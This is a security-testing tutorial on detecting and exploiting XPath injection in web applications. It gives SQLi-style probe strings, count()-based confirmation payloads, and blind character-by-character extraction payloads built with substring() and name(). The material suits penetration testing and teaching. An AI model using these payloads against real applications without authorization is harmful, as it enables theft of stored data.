# Finding XPath Injection Flaws

XPath injection flaws often manifest in ways similar to SQL injection. Although they use a different query language, many **classic SQLi test payloads** cause noticeable behavior changes in XPath-vulnerable applications.

---

## **Initial Probing for XPath Injection**

Attackers commonly test for XPath injection using standard input patterns:

### **Typical Test Strings**
* Likely to trigger XPath syntax errors:
  * `'`
  * `'--`

* Likely to cause **logic changes** without syntax errors (just like SQLi):
  * `' or 'a'='a`
  * `' and 'a'='b`
  * ` or 1=1`
  * ` and 1=2`

If such inputs **alter application behavior** without producing errors, the input may be being evaluated inside an XPath query.

---

## **HACK STEPS: Confirming and Exploiting XPath Injection**

### **Step 1: Behavioral Testing with Logical Conditions**

Submit payloads designed to test XPath expressions and observe for differing behavior:

**String-based tests:**
```text
' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b
```

**Numeric-based tests:**
```text
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
```

> If the application behaves differently between these inputs (e.g., showing or hiding content), this indicates that user input is being interpreted in XPath context.

---

### **Step 2: Begin Blind Extraction**

If behavior differs without errors, proceed with **conditional logic testing** to extract XML metadata and content:

* **Discover parent node name (blind enumeration):**
```xpath
substring(name(parent::*[position()=1]),1,1)= 'a'
```

This tests if the first character of the parent node’s name is `'a'`. Cycle through the alphabet until a condition returns true.

---

### **Step 3: Extract Node Values**

Once the parent node name is known (e.g., `address`), use positional XPath to extract node values one character at a time:

```xpath
substring(//address[position()=1]/child::node()[position()=1]/text(),1,1)= 'a'
```

Continue to:
* Increment `position()` to move through sibling nodes.
* Adjust `substring()` to cycle through character positions.

---

## **Summary**

* Many standard SQLi payloads also work for detecting XPath injection.
* Watch for **error-less but logic-altering** responses.
* Use XPath functions like `count()`, `name()`, `substring()` to craft blind injection payloads.
* Once confirmed, exploit using **inference-based data extraction**.
